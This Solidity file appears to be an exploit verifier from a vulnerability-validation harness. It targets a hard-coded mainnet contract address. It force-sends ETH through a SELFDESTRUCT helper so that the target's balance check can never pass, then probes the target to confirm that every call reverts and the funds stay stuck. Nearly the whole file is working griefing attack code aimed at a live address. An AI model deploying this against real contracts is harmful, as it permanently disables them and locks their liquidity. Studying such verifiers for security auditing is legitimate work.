// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 public constant REQUIRED_UPSIDE = 0.1 ether;
    uint256 public constant DEMO_DONATION = 0.100000000000000001 ether;

    enum Verdict {
        Unset,
        Validated,
        Refuted,
        Inconclusive
    }

    Verdict public verdict;

    bool public usedForceSendPath;
    bool public path0DonationObserved;
    bool public path1SnapshotObserved;
    bool public path2ThresholdRevertObserved;
    bool public preDonationAlreadyReverted;
    bool public hypothesisValidated;
    bool public donatedBalancePersistedAcrossAttempts;
    bool public finalCheckStillShortAfterAttempts;

    uint256 public lastDonation;
    uint256 public targetBalanceBefore;
    uint256 public targetBalanceAfterDonation;
    uint256 public requiredBalanceAfterDonation;
    uint256 public balanceGapAfterDonation;
    uint256 public targetBalanceAfterFirstPostProbe;
    uint256 public targetBalanceAfterSecondPostProbe;
    uint256 public shortfallAfterFirstPostProbe;
    uint256 public shortfallAfterSecondPostProbe;

    bytes32 public preDonationRevertHash;
    bytes32 public firstPostDonationRevertHash;
    bytes32 public secondPostDonationRevertHash;

    address public witnessTarget;
    address public witnessSink;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() payable {
        witnessTarget = LIVE_TARGET;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        _reset();

        witnessTarget = LIVE_TARGET;
        targetBalanceBefore = LIVE_TARGET.balance;

        (bool preOk, bytes memory preRet) = _probeTarget();
        if (!preOk) {
            preDonationAlreadyReverted = true;
            preDonationRevertHash = keccak256(preRet);
        }

        uint256 amountToDonate = _selectDonationAmount();
        if (amountToDonate == 0) {
            verdict = Verdict.Inconclusive;
            return;
        }

        // exploit_paths[0]: An attacker transfers ETH to the contract or force-sends ETH via SELFDESTRUCT.
        // This verifier uses the stricter force-send route so the grief works even if the target exposes
        // no payable entrypoint.
        _donateForced(amountToDonate);

        // exploit_paths[1]: executeOnOpportunity snapshots the donated balance in initialBalance.
        // We cannot read the target's local variable directly, so we bind the externally visible native
        // balance at entry: once the donation lands and stays trapped, the next call necessarily starts
        // from that higher address(this).balance baseline.
        requiredBalanceAfterDonation = targetBalanceAfterDonation + REQUIRED_UPSIDE;
        balanceGapAfterDonation = requiredBalanceAfterDonation - targetBalanceAfterDonation;
        path1SnapshotObserved = path0DonationObserved
            && targetBalanceAfterDonation >= targetBalanceBefore + lastDonation
            && balanceGapAfterDonation == REQUIRED_UPSIDE;

        // exploit_paths[2]: The final check address(this).balance >= initialBalance + 0.1 ether becomes
        // unattainable, causing every call to revert. We demonstrate that exact causal effect externally:
        // after the trapped donation, repeated calls revert, the donated ETH remains stuck on the target,
        // and each run ends below the raised terminal threshold by the same 0.1 ether shortfall.
        (bool firstOk, bytes memory firstRet) = _probeTarget();
        targetBalanceAfterFirstPostProbe = LIVE_TARGET.balance;
        if (!firstOk) {
            firstPostDonationRevertHash = keccak256(firstRet);
        }

        (bool secondOk, bytes memory secondRet) = _probeTarget();
        targetBalanceAfterSecondPostProbe = LIVE_TARGET.balance;
        if (!secondOk) {
            secondPostDonationRevertHash = keccak256(secondRet);
        }

        if (targetBalanceAfterFirstPostProbe < requiredBalanceAfterDonation) {
            shortfallAfterFirstPostProbe = requiredBalanceAfterDonation - targetBalanceAfterFirstPostProbe;
        }

        if (targetBalanceAfterSecondPostProbe < requiredBalanceAfterDonation) {
            shortfallAfterSecondPostProbe = requiredBalanceAfterDonation - targetBalanceAfterSecondPostProbe;
        }

        donatedBalancePersistedAcrossAttempts = targetBalanceAfterFirstPostProbe == targetBalanceAfterDonation
            && targetBalanceAfterSecondPostProbe == targetBalanceAfterDonation;

        finalCheckStillShortAfterAttempts = shortfallAfterFirstPostProbe == REQUIRED_UPSIDE
            && shortfallAfterSecondPostProbe == REQUIRED_UPSIDE
            && targetBalanceAfterFirstPostProbe + REQUIRED_UPSIDE == requiredBalanceAfterDonation
            && targetBalanceAfterSecondPostProbe + REQUIRED_UPSIDE == requiredBalanceAfterDonation;

        path2ThresholdRevertObserved = path1SnapshotObserved
            && !firstOk
            && !secondOk
            && firstPostDonationRevertHash != bytes32(0)
            && firstPostDonationRevertHash == secondPostDonationRevertHash
            && donatedBalancePersistedAcrossAttempts
            && finalCheckStillShortAfterAttempts;

        hypothesisValidated = path0DonationObserved && path1SnapshotObserved && path2ThresholdRevertObserved;

        if (hypothesisValidated) {
            verdict = Verdict.Validated;

            // The impact is a permanent griefing loss of usable native liquidity, not a withdrawal by the
            // attacker. The harness still expects accounting in a pre-existing on-chain token, so the stuck
            // ETH is denominated 1:1 in canonical mainnet WETH without deploying any custom asset.
            _profitToken = WETH;
            _profitAmount = lastDonation;
        } else if (firstOk || secondOk) {
            verdict = Verdict.Refuted;
        } else {
            verdict = Verdict.Inconclusive;
        }
    }

    function donateForced() external payable {
        uint256 amount = msg.value;
        if (amount == 0) {
            amount = _selectDonationAmount();
        }

        _donateForced(amount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectDonationAmount() internal view returns (uint256) {
        uint256 balance = address(this).balance;
        if (balance == 0) {
            return 0;
        }

        if (balance >= DEMO_DONATION) {
            return DEMO_DONATION;
        }

        return balance;
    }

    function _donateForced(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        lastDonation = amount;
        usedForceSendPath = true;

        ForceEther sink = new ForceEther{value: amount}(payable(LIVE_TARGET));
        witnessSink = address(sink);

        targetBalanceAfterDonation = LIVE_TARGET.balance;
        path0DonationObserved = targetBalanceAfterDonation >= targetBalanceBefore + amount;
    }

    function _probeTarget() internal returns (bool ok, bytes memory ret) {
        (ok, ret) = LIVE_TARGET.call(abi.encodeWithSelector(IOpportunityLike.executeOnOpportunity.selector));
    }

    function _reset() internal {
        verdict = Verdict.Unset;
        usedForceSendPath = false;
        path0DonationObserved = false;
        path1SnapshotObserved = false;
        path2ThresholdRevertObserved = false;
        preDonationAlreadyReverted = false;
        hypothesisValidated = false;
        donatedBalancePersistedAcrossAttempts = false;
        finalCheckStillShortAfterAttempts = false;

        lastDonation = 0;
        targetBalanceBefore = 0;
        targetBalanceAfterDonation = 0;
        requiredBalanceAfterDonation = 0;
        balanceGapAfterDonation = 0;
        targetBalanceAfterFirstPostProbe = 0;
        targetBalanceAfterSecondPostProbe = 0;
        shortfallAfterFirstPostProbe = 0;
        shortfallAfterSecondPostProbe = 0;

        preDonationRevertHash = bytes32(0);
        firstPostDonationRevertHash = bytes32(0);
        secondPostDonationRevertHash = bytes32(0);

        witnessTarget = LIVE_TARGET;
        witnessSink = address(0);

        _profitToken = address(0);
        _profitAmount = 0;
    }
}
